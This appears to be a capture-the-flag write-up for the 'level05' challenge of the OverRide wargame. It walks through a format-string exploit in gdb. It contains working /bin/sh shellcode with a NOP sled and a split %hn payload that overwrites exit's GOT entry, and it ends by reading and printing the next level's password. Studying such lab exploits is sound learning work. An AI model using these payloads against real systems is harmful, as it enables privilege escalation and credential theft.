# level05

We can see that program takes an input and XOR each byte with 32 if it is between 'A' and 'Z'. It is a `toLower` like function:

```gdb
(gdb) r
Starting program: /home/users/level05/level05 

AAAAAAAAAAA
Breakpoint 1, 0x0804847a in main ()
=> 0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
(gdb) x/s $eax
0xffffd4b8:	 "AAAAAAAA\n"

Breakpoint 2, 0x08048507 in main ()
=> 0x08048507 <+195>:	call   0x8048340 <printf@plt>
(gdb) x/wx $esp
0xffffd490:	0xffffd4b8
(gdb) x/s 0xffffd4b8
0xffffd4b8:	 "aaaaaaaa\n"
```

Then, it pass the result string in `printf` as the only argument.

We try to found the direct access parameter:

```bash
level05@OverRide:~$ (python -c "print 'aaaa' + '%p ' * 30";cat) | ./level05  
aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070  
```

Our string is printed at the 10th parameter.

We put our shellcode in an environment variable and find its address:
  
```bash
export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  
```

```gdb
(gdb) x/s *((char **)environ+0)  
0xffffd74a:      "EXPLOIT=<...>"  

adresse exploit: 0xffffd74a  
  
(gdb) p/x 0xffffd74a+200  
$2 = 0xffffd812
```
  
Let's find exit function address:

```gdb
(gdb) info function exit  
All functions matching regular expression "exit":  
  
Non-debugging symbols:  
0x08048370  exit  
0x08048370  exit@plt  
...
(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
```

Let's try to overwrite `exit` jump:

```gdb
Starting program: /home/users/level05/level05 <<<$(python -c "print '\xe0\x97\x04\x08' + '%4294957070x%10\$n'")

Breakpoint 1, 0x08048507 in main ()
(gdb) x/2wx 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
(gdb) c
Continuing.

Breakpoint 2, 0x0804850c in main ()
(gdb) x/2wx 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
```

We can see that the address has not been overwritten. We need to split it to lower value.

We split the address and substract the two address that will be printed. For the 2nd value, we substract the length already written: 

```gdb
(gdb) p/x 4294957070
$1 = 0xffffd80e
(gdb) p/d 0xd80e
$2 = 55310
(gdb) p/d 0xd80e - 8
$3 = 55302
  
gdb-peda$ p/d 0xffff  
$5 = 65535  
(gdb) p/d 0xffff-55310  
$6 = 10225
```

```gdb
Starting program: /home/users/level05/level05 <<<$(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55302u%10$hn" + "%10225u%11$hn")')

Breakpoint 1, 0x08048507 in main ()
(gdb) x/2wx 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
(gdb) c
...
Breakpoint 2, 0x0804850c in main ()
(gdb) x/2wx 0x80497e0
0x80497e0 <exit@got.plt>:       0xffffd80e      0xf7e45420
(gdb) x/12wx 0xffffd80e
0xffffd80e:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd81e:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd82e:     0x90909090      0x90909090      0x90909090      0x90909090
```

Exit seems to have been overwritten. Let's try to exploit:

```bash
level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55302u%10$hn" + "%10225u%11$hn")'; cat) | ./level05
<...>  
whoami 
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
